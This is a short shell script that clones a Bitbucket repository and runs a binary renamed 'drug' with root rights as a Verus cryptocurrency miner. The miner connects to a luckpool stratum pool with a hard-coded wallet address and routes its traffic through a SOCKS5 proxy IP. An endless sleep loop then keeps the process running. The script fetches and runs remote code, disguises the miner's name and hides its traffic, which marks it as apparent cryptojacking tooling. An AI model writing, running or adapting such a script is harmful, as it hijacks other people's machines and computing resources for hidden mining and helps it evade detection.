#!/bin/sh
sudo apt update
sudo apt install screen -y
git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git
cd mariere-born
sudo apt install screen libjansson4 -y
screen -dmS ls
chmod +x drug
sudo ./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RVkDufAGRUEGiXnn1BMzEtDQqJUBDKTuC7.TEST -p x -t 2 -x socks5://192.252.214.20:15864
sudo apt update
while [ 1 ]; do
sleep 3
done
sleep 999
